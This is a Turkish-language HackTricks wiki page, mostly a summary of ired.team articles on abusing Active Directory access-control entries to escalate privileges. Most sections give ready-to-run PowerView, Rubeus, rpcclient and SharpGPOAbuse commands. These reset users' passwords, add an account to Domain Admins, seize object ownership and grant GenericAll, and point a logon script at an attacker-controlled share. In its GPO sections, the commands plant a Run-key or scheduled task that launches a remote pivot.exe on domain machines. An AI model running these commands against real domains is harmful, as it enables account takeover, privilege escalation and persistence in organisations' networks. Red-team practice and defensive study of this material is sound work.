# Active Directory ACL'lerinin/ACE'lerinin Kötüye Kullanımı

<details>

<summary><strong>AWS hacklemeyi sıfırdan kahramana öğrenin</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong> ile!</strong></summary>

HackTricks'i desteklemenin diğer yolları:

* **Şirketinin HackTricks'te reklamını görmek istiyorsan** veya **HackTricks'i PDF olarak indirmek istiyorsan** [**ABONELİK PLANLARI**](https://github.com/sponsors/carlospolop)'na göz at!
* [**Resmi PEASS & HackTricks ürünlerini**](https://peass.creator-spring.com) edinin
* [**The PEASS Family'yi**](https://opensea.io/collection/the-peass-family) keşfedin, özel [**NFT'lerimiz**](https://opensea.io/collection/the-peass-family) koleksiyonumuz
* **Katılın** 💬 [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) veya bizi **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)'da **takip edin**.
* **Hacking püf noktalarınızı paylaşarak PR'lar göndererek** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github depolarına katkıda bulunun.

</details>

**Bu sayfa çoğunlukla** [**https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces**](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces) **ve** [**https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges**](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges)** tekniklerinin özetidir. Daha fazla ayrıntı için orijinal makalelere bakın.**

## **Kullanıcı Üzerinde GenericAll Hakları**

Bu ayrıcalık, bir saldırganın hedef kullanıcı hesabı üzerinde tam kontrol sağlar. `GenericAll` hakları `Get-ObjectAcl` komutu kullanılarak doğrulandığında, bir saldırgan şunları yapabilir:

* **Hedefin Parolasını Değiştirme**: `net user <kullanıcıadı> <parola> /domain` kullanarak saldırgan kullanıcının parolasını sıfırlayabilir.
* **Hedefe Yönelik Kerberoasting**: Kullanıcı hesabına bir SPN atayarak kerberoastable yapın, ardından Rubeus ve targetedKerberoast.py kullanarak bilet verme biletini (TGT) çıkartmaya ve kırmaya çalışın.
```powershell
Set-DomainObject -Credential $creds -Identity <username> -Set @{serviceprincipalname="fake/NOTHING"}
.\Rubeus.exe kerberoast /user:<username> /nowrap
Set-DomainObject -Credential $creds -Identity <username> -Clear serviceprincipalname -Verbose
```
* **Hedeflenen ASREPRoasting**: Kullanıcının ön kimlik doğrulamasını devre dışı bırakarak hesabını ASREPRoasting'e karşı savunmasız hale getirin.
```powershell
Set-DomainObject -Identity <username> -XOR @{UserAccountControl=4194304}
```
## **Grup Üzerinde GenericAll Hakları**

Bu ayrıcalık, bir saldırganın `Domain Admins` gibi bir grupta `GenericAll` haklarına sahipse grup üyeliklerini manipüle etmesine olanak tanır. Saldırgan, grubun ayırt edici adını `Get-NetGroup` ile belirledikten sonra şunları yapabilir:

* **Kendini Domain Yöneticileri Grubuna Eklemek**: Bu doğrudan komutlarla veya Active Directory veya PowerSploit gibi modüller kullanılarak yapılabilir.
```powershell
net group "domain admins" spotless /add /domain
Add-ADGroupMember -Identity "domain admins" -Members spotless
Add-NetGroupUser -UserName spotless -GroupName "domain admins" -Domain "offense.local"
```
## **GenericAll / GenericWrite / Write on Computer/User**

Bir bilgisayar nesnesi veya bir kullanıcı hesabında bu ayrıcalıklara sahip olmak şunları sağlar:

* **Kerberos Kaynak Tabanlı Kısıtlanmış Delege**: Bir bilgisayar nesnesini devralmayı mümkün kılar.
* **Gölge Kimlik Bilgileri**: Bu teknik kullanılarak, gölge kimlik bilgileri oluşturarak bir bilgisayar veya kullanıcı hesabını taklit etmek mümkündür.

## **WriteProperty on Group**

Bir kullanıcının belirli bir grup için (`Domain Admins` gibi) tüm nesneler üzerinde `WriteProperty` haklarına sahip olması durumunda, şunları yapabilir:

* **Kendini Domain Yöneticileri Grubuna Eklemek**: `net user` ve `Add-NetGroupUser` komutlarını birleştirerek başarılabilecek bu yöntem, alan içinde ayrıcalık yükseltmesine olanak tanır.
```powershell
net user spotless /domain; Add-NetGroupUser -UserName spotless -GroupName "domain admins" -Domain "offense.local"; net user spotless /domain
```
## **Grup Üyeliğinde Kendi (Kendi-Üyelik)**

Bu ayrıcalık saldırganların, `Domain Admins` gibi belirli gruplara kendilerini eklemelerine olanak tanır, doğrudan grup üyeliğini manipüle eden komutlar aracılığıyla. Aşağıdaki komut dizisi kullanılarak kendi kendine ekleme yapılabilir:
```powershell
net user spotless /domain; Add-NetGroupUser -UserName spotless -GroupName "domain admins" -Domain "offense.local"; net user spotless /domain
```
## **WriteProperty (Kendi Üyeliği)**

Benzer bir ayrıcalık, saldırganların, grup özelliklerini değiştirerek kendilerini gruplara doğrudan eklemelerine olanak tanır. Bu ayrıcalığın onaylanması ve uygulanması şu şekilde gerçekleştirilir:
```powershell
Get-ObjectAcl -ResolveGUIDs | ? {$_.objectdn -eq "CN=Domain Admins,CN=Users,DC=offense,DC=local" -and $_.IdentityReference -eq "OFFENSE\spotless"}
net group "domain admins" spotless /add /domain
```
## **ForceChangePassword**

Kullanıcı üzerinde `User-Force-Change-Password` için `ExtendedRight` tutmak, mevcut şifreyi bilmeksizin şifre sıfırlamaya izin verir. Bu hakkın doğrulanması ve istismarı PowerShell veya alternatif komut satırı araçları aracılığıyla gerçekleştirilebilir, kullanıcı şifresini sıfırlamanın çeşitli yöntemlerini sunar, etkileşimli oturumlar ve etkileşimsiz ortamlar için tek satırlık komutlar da dahil olmak üzere. Komutlar, basit PowerShell çağrılarından Linux üzerinde `rpcclient` kullanmaya kadar uzanır, saldırı vektörlerinin çeşitliliğini gösterir.
```powershell
Get-ObjectAcl -SamAccountName delegate -ResolveGUIDs | ? {$_.IdentityReference -eq "OFFENSE\spotless"}
Set-DomainUserPassword -Identity delegate -Verbose
Set-DomainUserPassword -Identity delegate -AccountPassword (ConvertTo-SecureString '123456' -AsPlainText -Force) -Verbose
```

```bash
rpcclient -U KnownUsername 10.10.10.192
> setuserinfo2 UsernameChange 23 'ComplexP4ssw0rd!'
```
## **Gruba WriteOwner Yetkisi Verme**

Bir saldırgan, bir grupta `WriteOwner` haklarına sahip olduğunu tespit ederse, grup sahipliğini kendisine değiştirebilir. Bu özellikle söz konusu grup `Domain Admins` ise etkilidir, çünkü sahipliğin değiştirilmesi grup özellikleri ve üyelikleri üzerinde daha geniş bir kontrol sağlar. Süreç, doğru nesneyi `Get-ObjectAcl` aracılığıyla tanımlamayı ve ardından `Set-DomainObjectOwner` kullanarak sahibi değiştirmeyi, ya SID ya da isimle yapmayı içerir.
```powershell
Get-ObjectAcl -ResolveGUIDs | ? {$_.objectdn -eq "CN=Domain Admins,CN=Users,DC=offense,DC=local" -and $_.IdentityReference -eq "OFFENSE\spotless"}
Set-DomainObjectOwner -Identity S-1-5-21-2552734371-813931464-1050690807-512 -OwnerIdentity "spotless" -Verbose
Set-DomainObjectOwner -Identity Herman -OwnerIdentity nico
```
## **Kullanıcı Üzerinde GenericWrite**

Bu izin, bir saldırganın kullanıcı özelliklerini değiştirmesine olanak tanır. Özellikle, `GenericWrite` erişimi ile saldırgan, bir kullanıcının oturum açma betiğini değiştirerek kullanıcı oturum açılırken kötü amaçlı bir betiği yürütebilir. Bu, hedef kullanıcının `scriptpath` özelliğini saldırganın betiğine işaret etmek için `Set-ADObject` komutunu kullanarak gerçekleştirilir.
```powershell
Set-ADObject -SamAccountName delegate -PropertyName scriptpath -PropertyValue "\\10.0.0.5\totallyLegitScript.ps1"
```
## **Grup Üzerinde GenericWrite**

Bu ayrıcalıkla, saldırganlar kendilerini veya diğer kullanıcıları belirli gruplara ekleyebilir veya çıkarabilir. Bu işlem, bir kimlik nesnesi oluşturmayı, bu nesneyi kullanarak kullanıcıları bir gruptan eklemeyi veya çıkarmayı ve üyelik değişikliklerini PowerShell komutlarıyla doğrulamayı içerir.
```powershell
$pwd = ConvertTo-SecureString 'JustAWeirdPwd!$' -AsPlainText -Force
$creds = New-Object System.Management.Automation.PSCredential('DOMAIN\username', $pwd)
Add-DomainGroupMember -Credential $creds -Identity 'Group Name' -Members 'username' -Verbose
Get-DomainGroupMember -Identity "Group Name" | Select MemberName
Remove-DomainGroupMember -Credential $creds -Identity "Group Name" -Members 'username' -Verbose
```
## **WriteDACL + WriteOwner**

Bir AD nesnesine sahip olmak ve üzerinde `WriteDACL` ayrıcalıklarına sahip olmak, saldırganın nesne üzerinde `GenericAll` ayrıcalıklarını kendilerine vermesine olanak tanır. Bu, ADSI manipülasyonu aracılığıyla gerçekleştirilir, nesne üzerinde tam kontrol sağlar ve grup üyeliklerini değiştirme yeteneği sunar. Bununla birlikte, bu ayrıcalıkları sömürmeye çalışırken Active Directory modülünün `Set-Acl` / `Get-Acl` komut dosyalarını kullanarak bazı sınırlamalar mevcuttur.
```powershell
$ADSI = [ADSI]"LDAP://CN=test,CN=Users,DC=offense,DC=local"
$IdentityReference = (New-Object System.Security.Principal.NTAccount("spotless")).Translate([System.Security.Principal.SecurityIdentifier])
$ACE = New-Object System.DirectoryServices.ActiveDirectoryAccessRule $IdentityReference,"GenericAll","Allow"
$ADSI.psbase.ObjectSecurity.SetAccessRule($ACE)
$ADSI.psbase.commitchanges()
```
## **Etki Alanında Çoğaltma (DCSync)**

DCSync saldırısı, etki alanında belirli çoğaltma izinlerinden yararlanarak Bir Alan Denetleyicisini taklit eder ve kullanıcı kimlik bilgileri de dahil olmak üzere verileri senkronize eder. Bu güçlü teknik, saldırganlara Bir Alan Denetleyicisine doğrudan erişim olmadan AD ortamından hassas bilgileri çıkarmalarını sağlayan `DS-Replication-Get-Changes` gibi izinler gerektirir. [**DCSync saldırısı hakkında daha fazla bilgi edinin buradan.**](../dcsync.md)

## GPO Yetkilendirme <a href="#gpo-delegation" id="gpo-delegation"></a>

### GPO Yetkilendirme

Grup İlkesi Nesnelerini (GPO'lar) yönetmek için yetkilendirilmiş erişim önemli güvenlik riskleri oluşturabilir. Örneğin, `offense\spotless` gibi bir kullanıcıya GPO yönetim hakları verilmişse, **WriteProperty**, **WriteDacl** ve **WriteOwner** gibi ayrıcalıklara sahip olabilirler. Bu izinler kötü niyetli amaçlar için kötüye kullanılabilir, PowerView kullanılarak tespit edilebilir: `bash Get-ObjectAcl -ResolveGUIDs | ? {$_.IdentityReference -eq "OFFENSE\spotless"}`

### GPO İzinlerini Sıralama

Yanlış yapılandırılmış GPO'ları tanımlamak için PowerSploit'in cmdlet'leri bir araya getirilebilir. Bu, belirli bir kullanıcının yönetme izinlerine sahip olduğu GPO'ların keşfedilmesine olanak tanır: `powershell Get-NetGPO | %{Get-ObjectAcl -ResolveGUIDs -Name $_.Name} | ? {$_.IdentityReference -eq "OFFENSE\spotless"}`

**Belirli Bir Politikanın Uygulandığı Bilgisayarlar**: Belirli bir GPO'nun hangi bilgisayarlara uygulandığını çözmek mümkündür, potansiyel etki alanının kapsamını anlamaya yardımcı olur. `powershell Get-NetOU -GUID "{DDC640FF-634A-4442-BC2E-C05EED132F0C}" | % {Get-NetComputer -ADSpath $_}`

**Belirli Bir Bilgisayara Uygulanan Politikalar**: Belirli bir bilgisayara uygulanan politikaları görmek için `Get-DomainGPO` gibi komutlar kullanılabilir.

**Belirli Bir Politikaya Uygulanan OU'lar**: Belirli bir politika tarafından etkilenen organizasyon birimlerini (OU'lar) tanımlamak için `Get-DomainOU` kullanılabilir.

### GPO Kötüye Kullanımı - New-GPOImmediateTask

Yanlış yapılandırılmış GPO'lar, örneğin, hemen planlanmış bir görev oluşturarak kodu yürütmek için kötüye kullanılabilir. Bu, etkilenen makinelerde bir kullanıcıyı yerel yöneticiler grubuna eklemek gibi ayrıcalıkları önemli ölçüde yükseltebilir:
```powershell
New-GPOImmediateTask -TaskName evilTask -Command cmd -CommandArguments "/c net localgroup administrators spotless /add" -GPODisplayName "Misconfigured Policy" -Verbose -Force
```
### GroupPolicy modülü - GPO Kötüye Kullanımı

GroupPolicy modülü, yüklendiği takdirde yeni GPO'ların oluşturulması ve bağlanması, etkilenen bilgisayarlarda arka kapıları yürütmek için kayıt defteri değerlerinin ayarlanması gibi tercihlerin yapılmasına olanak tanır. Bu yöntem, GPO'nun güncellenmesini ve yürütme için bir kullanıcının bilgisayara giriş yapmasını gerektirir:
```powershell
New-GPO -Name "Evil GPO" | New-GPLink -Target "OU=Workstations,DC=dev,DC=domain,DC=io"
Set-GPPrefRegistryValue -Name "Evil GPO" -Context Computer -Action Create -Key "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" -ValueName "Updater" -Value "%COMSPEC% /b /c start /b /min \\dc-2\software\pivot.exe" -Type ExpandString
```
### SharpGPOAbuse - GPO'ları Kötüye Kullanma

SharpGPOAbuse, mevcut GPO'ları kötüye kullanma yöntemi sunar, yeni GPO'lar oluşturmadan görevler ekleyerek veya ayarları değiştirerek. Bu araç, değişiklikler uygulanmadan önce mevcut GPO'ların değiştirilmesini veya yeni GPO'ların oluşturulmasını gerektirir:
```bash
.\SharpGPOAbuse.exe --AddComputerTask --TaskName "Install Updates" --Author NT AUTHORITY\SYSTEM --Command "cmd.exe" --Arguments "/c \\dc-2\software\pivot.exe" --GPOName "PowerShell Logging"
```
### Politika Güncellemesini Zorla

GPO güncellemeleri genellikle her 90 dakikada bir gerçekleşir. Bu süreci hızlandırmak için, özellikle bir değişiklik uyguladıktan sonra hedef bilgisayarda hemen bir politika güncellemesi zorlamak için `gpupdate /force` komutu kullanılabilir. Bu komut, GPO'lara yapılan herhangi bir değişikliğin otomatik güncelleme döngüsünü beklemeksizin uygulandığından emin olur.

### Detaylar

Belirli bir GPO için Zamanlanmış Görevler incelendiğinde, `Hatalı Yapılandırılmış Politika` gibi, `evilTask` gibi görevlerin eklenmiş olabileceği doğrulanabilir. Bu görevler, sistem davranışını değiştirmeyi veya ayrıcalıkları yükseltmeyi amaçlayan betikler veya komut satırı araçları aracılığıyla oluşturulur.

`New-GPOImmediateTask` tarafından oluşturulan XML yapılandırma dosyasında görevin yapısı, zamanlanmış görevin ayrıntılarını - yürütülecek komutu ve tetikleyicilerini - belirtir. Bu dosya, zamanlanmış görevlerin GPO'lar içinde nasıl tanımlandığını ve yönetildiğini temsil eder, politika uygulamasının bir parçası olarak keyfi komutların veya betiklerin yürütülmesi için bir yöntem sağlar.

### Kullanıcılar ve Gruplar

GPO'lar ayrıca hedef sistemlerde kullanıcı ve grup üyeliklerinin manipülasyonuna izin verir. Saldırganlar, Kullanıcılar ve Gruplar politika dosyalarını doğrudan düzenleyerek, yeni kullanıcıları yerel `yöneticiler` grubu gibi ayrıcalıklı gruplara ekleyebilir. Bu, GPO yönetim izinlerinin devredilmesi yoluyla mümkündür, bu da politika dosyalarının değiştirilmesine ve yeni kullanıcıların eklenmesine veya grup üyeliklerinin değiştirilmesine izin verir.

Kullanıcılar ve Gruplar için XML yapılandırma dosyası, bu değişikliklerin nasıl uygulandığını açıklar. Bu dosyaya girişler ekleyerek, belirli kullanıcılara etkilenen sistemlerde yükseltilmiş ayrıcalıklar verilebilir. Bu yöntem, GPO manipülasyonu aracılığıyla ayrıcalık yükseltme için doğrudan bir yaklaşım sunar.

Ayrıca, oturum açma/oturumu kapatma betiklerinden yararlanma, otomatik çalıştırmalar için kayıt defteri anahtarlarını değiştirme, .msi dosyaları aracılığıyla yazılım yükleme veya hizmet yapılandırmalarını düzenleme gibi kod yürütme veya kalıcılığı sürdürme için ek yöntemler de düşünülebilir. Bu teknikler, GPO'ların kötüye kullanımıyla erişimi sürdürme ve hedef sistemleri kontrol etme için çeşitli olanaklar sunar.

## Referanslar

* [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces)
* [https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges)
* [https://wald0.com/?p=112](https://wald0.com/?p=112)
* [https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices.activedirectoryrights?view=netframework-4.7.2](https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices.activedirectoryrights?view=netframework-4.7.2)
* [https://blog.fox-it.com/2018/04/26/escalating-privileges-with-acls-in-active-directory/](https://blog.fox-it.com/2018/04/26/escalating-privileges-with-acls-in-active-directory/)
* [https://adsecurity.org/?p=3658](https://adsecurity.org/?p=3658)
* [https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices.activedirectoryaccessrule.-ctor?view=netframework-4.7.2#System\_DirectoryServices\_ActiveDirectoryAccessRule\_\_ctor\_System\_Security\_Principal\_IdentityReference\_System\_DirectoryServices\_ActiveDirectoryRights\_System\_Security\_AccessControl\_AccessControlType\_](https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices.activedirectoryaccessrule.-ctor?view=netframework-4.7.2#System\_DirectoryServices\_ActiveDirectoryAccessRule\_\_ctor\_System\_Security\_Principal\_IdentityReference\_System\_DirectoryServices\_ActiveDirectoryRights\_System\_Security\_AccessControl\_AccessControlType\_)

<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)</strong> ile sıfırdan kahraman olmaya kadar AWS hacklemeyi öğrenin</summary>

HackTricks'ı desteklemenin diğer yolları:

* **Şirketinizi HackTricks'te reklamını görmek** veya **HackTricks'i PDF olarak indirmek** için [**ABONELİK PLANLARI**](https://github.com/sponsors/carlospolop)'na göz atın!
* [**Resmi PEASS & HackTricks ürünlerini**](https://peass.creator-spring.com) edinin
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family) koleksiyonumuzdaki özel [**NFT'leri**](https://opensea.io/collection/the-peass-family) keşfedin
* **💬 [Discord grubuna](https://discord.gg/hRep4RUj7f) veya [telegram grubuna](https://t.me/peass) katılın veya** Twitter'da 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)**'u takip edin.**
* **Hacking püf noktalarınızı göndererek HackTricks ve HackTricks Cloud github depolarına PR göndererek paylaşın.**

</details>
